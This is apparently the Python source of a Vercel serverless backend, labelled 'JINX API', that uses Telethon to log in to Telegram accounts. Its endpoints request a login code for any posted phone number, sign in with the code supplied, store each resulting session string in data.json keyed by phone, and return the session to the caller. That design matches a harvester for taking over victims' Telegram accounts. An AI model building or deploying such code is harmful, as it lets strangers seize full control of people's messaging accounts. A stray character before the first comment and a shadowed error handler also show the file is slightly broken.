l# api/index.py — VERCEL SERVERLESS (SYNC + HANDLER)
import os
import json
import urllib.parse
from telethon.sync import TelegramClient
from telethon.sessions import StringSession

# BACA session.txt
def get_session():
    if os.path.exists('session.txt'):
        with open('session.txt', 'r') as f:
            content = f.read().strip()
            if '=' in content:
                return content.split('=', 1)[1].strip()
            return content.strip()
    return None

API_ID = int(os.getenv('API_ID', '0'))
API_HASH = os.getenv('API_HASH', '')
SESSION_STRING = get_session() or os.getenv('SESSION_STRING')

if not all([API_ID, API_HASH, SESSION_STRING]):
    def handler(event, context):
        return {
            'statusCode': 500,
            'body': json.dumps({'error': 'SESSION_STRING / ENV RUSAK!'})
        }

DATA_FILE = 'data.json'

def load():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {}

def save(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def send_code_sync(phone):
    try:
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        client.connect()
        res = client.send_code_request(phone)
        client.disconnect()
        return {"success": True, "hash": res.phone_code_hash}
    except Exception as e:
        return {"success": False, "error": str(e)}

def login_sync(phone, code, hash_code):
    try:
        client = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
        client.connect()
        client.sign_in(phone, code=code, phone_code_hash=hash_code)
        sess = client.session.save()
        data = load()
        data[phone] = {"session": sess}
        save(data)
        client.disconnect()
        return {"success": True, "session": sess}
    except Exception as e:
        return {"success": False, "error": str(e)}

# VERCEL HANDLER
def handler(event, context):
    path = event.get('path', '')
    method = event.get('httpMethod', '')

    if path == '/' and method == 'GET':
        return {
            'statusCode': 200,
            'body': json.dumps({"message": "JINX API JALAN! (Vercel)"})
        }

    if path == '/send_code' and method == 'POST':
        body = event.get('body', '')
        parsed = urllib.parse.parse_qs(body)
        phone = parsed.get('phone', [None])[0]
        if not phone:
            return {'statusCode': 400, 'body': json.dumps({'error': 'no phone'})}
        result = send_code_sync(phone)
        return {'statusCode': 200, 'body': json.dumps(result)}

    if path == '/login' and method == 'POST':
        body = event.get('body', '')
        parsed = urllib.parse.parse_qs(body)
        phone = parsed.get('phone', [None])[0]
        code = parsed.get('code', [None])[0]
        hash_code = parsed.get('hash', [None])[0]
        if not all([phone, code, hash_code]):
            return {'statusCode': 400, 'body': json.dumps({'error': 'missing'})}
        result = login_sync(phone, code, hash_code)
        return {'statusCode': 200, 'body': json.dumps(result)}

    return {'statusCode': 404, 'body': json.dumps({'error': 'not found'})}
